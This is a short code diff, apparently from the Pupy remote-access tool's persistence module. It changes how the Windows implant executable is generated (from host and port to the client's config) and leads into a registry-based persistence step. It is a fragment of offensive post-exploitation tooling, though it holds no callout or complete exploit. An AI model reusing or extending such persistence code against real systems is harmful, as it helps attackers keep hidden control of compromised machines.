@@ -46,9 +46,9 @@ class PersistenceModule(PupyModule):
 			#generating exe
 			self.info("generating exe ...")
 			if self.client.desc['proc_arch']=="64bit":
-				exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
+				exebuff=pupygen.get_edit_pupyx64_exe(self.client.get_conf())
 			else:
-				exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
+				exebuff=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
 		if args.method=="registry":
 			self.client.load_package("pupwinutils.persistence")
 
